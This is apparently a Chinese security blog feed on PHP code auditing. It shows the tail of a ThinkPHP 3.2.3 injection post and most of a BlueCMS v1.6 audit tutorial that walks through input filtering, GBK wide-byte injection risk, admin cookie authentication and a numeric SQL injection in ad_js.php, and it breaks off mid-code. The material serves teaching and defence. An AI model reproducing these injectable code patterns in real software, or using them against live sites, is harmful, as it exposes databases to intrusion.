class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;find(<span class="hljs-variable">$id</span>);<br><span class="hljs-comment">// order 注入漏洞</span><br><span class="hljs-variable">$order</span> = I(<span class="hljs-string">&#x27;GET.order&#x27;</span>);<br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;order(<span class="hljs-variable">$order</span>)-&gt;find();<br></code></pre></td></tr></table></figure><p>参考：</p><p>ThinkPHP3.2.3完全开发教程：<a href="https://www.kancloud.cn/manual/thinkphp/">https://www.kancloud.cn/manual/thinkphp/</a></p><p>Thinkphp3 漏洞总结：<a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p><p>Thinkphp3个版本数据库操作以及底层代码分析：<a href="https://hu3sky.github.io/">https://hu3sky.github.io</a></p><p>Thinkphp v3.2.3 select&amp;find&amp;delete 注入漏洞：<a href="https://xz.aliyun.com/t/2629">https://xz.aliyun.com/t/2629</a></p><p>Thinkphp v3.2.3 update注入漏洞：<a href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p><p>ThinkPhp3.2.3缓存漏洞复现以及修复建议：<a href="https://www.pianshen.com/article/4312352780/">https://www.pianshen.com/article/4312352780/</a></p>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>代码审计</tag>
      
      <tag>ThinkPHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过 BlueCMS 学习 php 代码审计</title>
    <link href="/2021/09/10/blue/"/>
    <url>/2021/09/10/blue/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近一直在学习php代码审计，入门过程比自己想象的慢很多，现在各个行业都在内卷，代码审计随着 web 开发技术的发展也会变得更加复杂。但不管现在技术多成熟，多复杂，基础知识一定要扎实。先记录下我目前学习php代码审计的过程：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">php基础语法巩固 -&gt; php特性 -&gt; 各漏洞挖掘方法 -&gt; 从早期到近代的无MVC架构的CMS代码审计实战 -&gt; 成熟的MVC架构代码审计实战<br></code></pre></td></tr></table></figure><p>网上已经有很多讲解如何去审计各种php程序漏洞的博客，大家都讲的很好，但学完这些知识后去真正上手审计一个CMS时，会突然发现自己什么都不会，我总结原因是自己的 web 开发知识太少了，不理解程序的逻辑，导致在审计大量代码时会晕头转向，没有方向</p><p>然后我边学最基础的web开发知识， 边找最简单的 CMS 实战审计，然后逐渐增加难度，慢慢的找到了感觉。目前我认为自己还是一个菜鸡，确实也还是一个菜鸡，所以自己打算好好整理 <code>从早期到近代的无MVC架构的CMS代码审计实战 -&gt; 成熟的MVC架构代码审计实战</code> 的过程，并在博客上发表</p><p> <code>从早期到近代的无MVC架构的CMS代码审计实战 </code> 我依次选择了 BlueCMS, SeaCMS, DedeCMS, PhpCMS 这 4 个CMS，理由很简单，从简单到难，与之对应的是他们的活跃时间也逐渐靠近我们，在对这几个系统的代码审计过程中，也能感受到 web 开发技术的发展和趋势，相信完成这步后再审计非 MVC 架构的程序代码就会具有清晰的思路与把握</p><h1 id="0x01-BlueCMS-简介"><a href="#0x01-BlueCMS-简介" class="headerlink" title="0x01 BlueCMS 简介"></a>0x01 BlueCMS 简介</h1><p>BlueCMS 是一款应用于地方分类信息的门户系统，本文下载的源码为 BlueCMS v1.6 sp1版，可以追溯到2010年左右了，该系统确实很老，但审计该系统有一个好处是，即使现在web开发技术十分成熟了，但仍有人因为经验缺乏或时间原因会开发出类似BlueCMS这样简单的系统，甚至比BlueCMS更简单。通过对 BlueCMS 实战审计，能够熟悉这类简单 CMS 的程序逻辑</p><p>BlueCMS 被认为是练手代码审计的绝佳项目，以至于现在百度BlueCMS的关键词全是代码审计。那为什么 BlueCMS 都被审计烂了，我还要在发一篇BlueCMS的代码审计博客呢？首先BlueCMS确实经典，是一个入门的好项目；其次BlueCMS是无MVC架构时期最早流行的一批CMS，是 <code>从早期到近代无MVC架构的CMS代码审计实战 </code> 系列最标志的第一环</p><p>BlueCMS 源码也不太好找，这里推荐站长之家（<a href="http://down.chinaz.com/%EF%BC%89%EF%BC%8Cyyds">http://down.chinaz.com/），yyds</a></p><p>BlueCMS本地部署好后，先访问 /install/index.php 进行安装，感觉过程有点bug，不过返回首页后会发现安装成功</p><h1 id="0x02-全局分析"><a href="#0x02-全局分析" class="headerlink" title="0x02 全局分析"></a>0x02 全局分析</h1><p>在学完php的各漏洞代码审计方法后我就直接利用 seay 去扫描代码敏感关键字回溯的方法去审计代码，但在过程中却逐渐蒙圈，经验总结，在审计一个成熟的CMS之间，还是要做好全局分析的工作</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>通过目录结构可以简单看出程序的逻辑</p><p>目录结构主要关注入口文件index.php在程序中的位置，BlueCMS时期的程序 index.php 基本位于程序根目录下，其实这是不安全的，会导致整个程序文件被窃取的风险，在审计后面的CMS中会发现这个问题会改善</p><img src="img/blueCMS/image-20210527105213302.png" alt="image-20210527105213302" style="zoom:50%;" /><h2 id="首页-index-php"><a href="#首页-index-php" class="headerlink" title="首页 index.php"></a>首页 index.php</h2><ul><li>首页 index.php 首先会加载 <code>common.inc.php</code>，<code>include/index.fun.php</code> 这些文件具体做了什么后面仔细分析</li><li>然后 index.php 就从数据库中获取首页信息，利用smarty模板显示。Smarty是BlueCMS引用的一个成熟的PHP模板引擎，Smarty在那个时期也是很火的，关于Smarty的具体实现代码我们就可以忽略了</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;include/common.inc.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/index.fun.php&#x27;</span>);<br><span class="hljs-comment">// 获取新闻栏目、新闻分类列表、网站公告等数据</span><br>……<br><span class="hljs-comment">// 利用smarty模板引擎显示页面</span><br><span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;index.htm&#x27;</span>);<br></code></pre></td></tr></table></figure><p>可以看出index.php并不能算入口文件，它只是在做一个页面的显示工作，从这里我们大概知道前台是一个多入口的模式，注意多入口的系统需要对每个入口文件单独做安全过滤，它们通常都会加载同一个文件来实现，在BlueCMS中这个文件就是common.inc.php</p><h2 id="include-common-inc-php"><a href="#include-common-inc-php" class="headerlink" title="include/common.inc.php"></a>include/common.inc.php</h2><ul><li>对GPC数据做了过滤，但外部可控数据还包括 <code>$_SERVER</code>没有经过过滤</li><li>还需要留意的是 comon.inc.php 还做好了数据库连接工作，$db 为连接数据的对象，后续可以直接使用</li><li>comon.inc.php 的其他处理逻辑注释即可</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载一些基础文件</span><br><span class="hljs-keyword">require_once</span> (BLUE_ROOT.<span class="hljs-string">&#x27;include/common.fun.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/cat.fun.php&#x27;</span>);<br><br><span class="hljs-comment">// 外部数据过滤</span><br><span class="hljs-keyword">if</span>(!get_magic_quotes_gpc())<br>&#123;<br><span class="hljs-variable">$_POST</span> = deep_addslashes(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$_GET</span> = deep_addslashes(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-variable">$_COOKIES</span> = deep_addslashes(<span class="hljs-variable">$_COOKIES</span>);<br><span class="hljs-variable">$_REQUEST</span> = deep_addslashes(<span class="hljs-variable">$_REQUEST</span>);<br>&#125;<br><br><span class="hljs-comment">// 数据库链接</span><br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/mysql.class.php&#x27;</span>);<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> mysql(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-comment">// Smarty模板对象就是这引入的</span><br><span class="hljs-keyword">require</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/smarty/Smarty.class.php&#x27;</span>);<br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> Smarty();<br><br><span class="hljs-comment">// 用户ip处理</span><br><span class="hljs-variable">$banned_ip</span> = get_bannedip();<br><span class="hljs-keyword">if</span> (@in_array(<span class="hljs-variable">$online_ip</span>, <span class="hljs-variable">$banned_ip</span>))<br>&#123;<br>showmsg(<span class="hljs-string">&#x27;对不起，您的IP已被禁止，有问题请联系管理员!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="外部数据的具体过滤方式"><a href="#外部数据的具体过滤方式" class="headerlink" title="外部数据的具体过滤方式"></a>外部数据的具体过滤方式</h3><p>追踪一下<code>deep_addslashes()</code>方法，看下数据过滤的具体实现方式</p><blockquote><p>/include/common.fun.php</p></blockquote><p>具体过滤函数是addslashes()，在此情况下引号形式的sql注入基本会被过滤，所以凡是加了common.inc.php的入口文件，基本会实现这些过滤操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// include/common.fun.php 14-28:</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deep_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$str</span>))<br>&#123;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)<br>&#123;<br><span class="hljs-variable">$str</span>[<span class="hljs-variable">$key</span>] = deep_addslashes(<span class="hljs-variable">$val</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$str</span> = addslashes(<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据库连接方式"><a href="#数据库连接方式" class="headerlink" title="数据库连接方式"></a>数据库连接方式</h3><blockquote><p>include/mysql.class.php</p></blockquote><ul><li>数据库连接方法是mysql_connect()，<code>$linkid</code>存放<strong>MySQL 连接标识</strong></li><li>这里应该提取到一个十分关键的信息，数据库编码为gbk，那么程序就有宽字节注入的可能</li><li>然后会看到mysql类还封装了很多底层sql的执行方法，知道这些方法是干嘛的就行</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$linkid</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$dbcharset</span> = <span class="hljs-string">&#x27;gbk&#x27;</span>, <span class="hljs-variable">$connect</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>    <span class="hljs-keyword">$this</span> -&gt; mysql(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$dbcharset</span>, <span class="hljs-variable">$connect</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mysql</span>(<span class="hljs-params"><span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$dbcharset</span> = <span class="hljs-string">&#x27;gbk&#x27;</span>, <span class="hljs-variable">$connect</span>=<span class="hljs-number">1</span></span>)</span>&#123;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$connect</span>) ? <span class="hljs-string">&#x27;mysql_pconnect&#x27;</span> : <span class="hljs-string">&#x27;mysql_connect&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;linkid = @<span class="hljs-variable">$func</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-literal">true</span>))&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;dbshow(<span class="hljs-string">&#x27;Can not connect to Mysql!&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;dbversion() &gt; <span class="hljs-string">&#x27;4.1&#x27;</span>)&#123;<br>    mysql_query( <span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br>    &#125;<br>    &#125;<br>    &#125;<br>  <span class="hljs-comment">// mysql_query()封装执行sql语句的方法</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$query</span>=@mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;linkid))&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;dbshow(<span class="hljs-string">&quot;Query error:<span class="hljs-subst">$sql</span>&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$query</span>;<br>    &#125;<br>    &#125;<br>  <span class="hljs-comment">//getone() 封装查询数据的方法</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getone</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;<br>    <span class="hljs-variable">$query</span> = <span class="hljs-keyword">$this</span>-&gt;query(<span class="hljs-variable">$sql</span>,<span class="hljs-keyword">$this</span>-&gt;linkid);<br>    <span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$query</span>, <span class="hljs-variable">$type</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>;<br>    &#125;<br>  ……<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="后台逻辑分析"><a href="#后台逻辑分析" class="headerlink" title="后台逻辑分析"></a>后台逻辑分析</h2><p>后台一般只有通过身份验证后才能访问，提前就有一层安全保障，但后台程序一般都是漏洞百出，我们很多时候只有靠后台才能拿到服务器的shell。这里具体分析一下BlueCMS的后台逻辑</p><h3 id="后台入口文件"><a href="#后台入口文件" class="headerlink" title="后台入口文件"></a>后台入口文件</h3><blockquote><p>admin/index.php</p></blockquote><ul><li>admin/index.php 的大部分逻辑由 admin/include/common.inc.php 处理</li><li>index.php 剩下内容主要用于显示后台的页面</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/include/common.inc.php&quot;</span>);<br><span class="hljs-variable">$act</span>=!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) ? trim(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>  <span class="hljs-comment">// 显示后台页面</span><br>  <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;index.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;top&#x27;</span>)<br>&#123;<br><span class="hljs-comment">// 显示顶部</span><br><span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;top.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;menu&#x27;</span>)&#123;<br>  <span class="hljs-comment">// 显示菜单</span><br>  <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;menu.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;main&#x27;</span>)&#123;<br>  <span class="hljs-comment">// 显示主体页面</span><br>  <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;main.htm&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>admin/templates/default/index.htm</p></blockquote><p>关注 index.htm 可以知道后台是通过frame来实现的，这样后台程序的所有功能都可以依附在index.php下实现，在早期的CMS中，基本都是这种实现方案</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;76,*&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index.php?act=top&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;topFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;topFrame&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">noresize</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;176,*&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bodyFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bodyFrame&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span>  &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index.php?act=menu&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;menuFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;menuFrame&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-attr">noresize</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index.php?act=main&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mainFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mainFrame&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">noresize</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="common-inc-php处理细节"><a href="#common-inc-php处理细节" class="headerlink" title="common.inc.php处理细节"></a>common.inc.php处理细节</h3><blockquote><p>admin/include/common.inc.php</p></blockquote><p>该文件内容和 include/common.inc.php 差不多，不同之处在于多了管理员的认证，如果看到加载了 include/common.inc.php 的文件，那么该文件基本为后台访问页面</p><ul><li>可以看到 BlueCMS 主要通过session的方法认证用户登陆状态，如果 <code>$_SESSION[&#39;admin_id&#39;]</code> 存在则通过验证并刷新用户登陆记录</li><li>当前用户 session 信息为空时则会判断用户的cookie信息，如果设置了cookie信息则判断cookie的账号密码是否能登陆</li><li>如果未设置cookie信息，则跳转到<code>login.php?act=login</code>页面重新登陆</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载一些基础文件</span><br><span class="hljs-keyword">require_once</span>(……)<br><span class="hljs-comment">// 外部数据过滤</span><br>deep_addslashes()<br><span class="hljs-comment">// 数据库链接</span><br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/mysql.class.php&#x27;</span>);<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> mysql(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// 加载smarty模板引擎</span><br><span class="hljs-keyword">require</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/smarty/Smarty.class.php&#x27;</span>);<br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> Smarty();<br><span class="hljs-comment">// 管理员身份认证</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>] != <span class="hljs-string">&#x27;login&#x27;</span> &amp;&amp; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>] != <span class="hljs-string">&#x27;do_login&#x27;</span> &amp;&amp; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>] != <span class="hljs-string">&#x27;logout&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_id&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_pwd&#x27;</span>])&#123;<br>        <span class="hljs-keyword">if</span>(check_cookie(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>], <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_pwd&#x27;</span>]))&#123;<br>          update_admin_info(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Blue&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>]);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        setcookie(<span class="hljs-string">&quot;Blue[admin_id]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-variable">$cookiepath</span>, <span class="hljs-variable">$cookiedomain</span>);<br>        setcookie(<span class="hljs-string">&quot;Blue[admin_name]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-variable">$cookiepath</span>, <span class="hljs-variable">$cookiedomain</span>);<br>        setcookie(<span class="hljs-string">&quot;Blue[admin_pwd]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-variable">$cookiepath</span>, <span class="hljs-variable">$cookiedomain</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;top.location=&quot;login.php?act=login&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>])&#123;<br>     update_admin_info(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-漏洞审计"><a href="#0x03-漏洞审计" class="headerlink" title="0x03 漏洞审计"></a>0x03 漏洞审计</h1><h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><p>通过BlueCMS我们可以看到各种常见的漏洞写法</p><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><blockquote><p>ad_js.php</p></blockquote><ul><li>ad_js.php 加载了common.inc.php，会对GPC数据做 addslashes() 过滤</li><li><code>$ad_id</code> 通过 $_GET 方式获取，会自动经过一层过滤，最终传入到sql语句执行</li><li>在执行的sql语句中发现 <code>$ad_id</code> 没有引号包裹，而且没有做数字型判断，那么这里很有可能存在数字型sql注入</li><li>sql查询结果最后是用注释的方式放在页面上</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>;<br><span class="hljs-variable">$ad_id</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) ? trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$ad</span> = <span class="hljs-variable">$db</span>-&gt;getone(<span 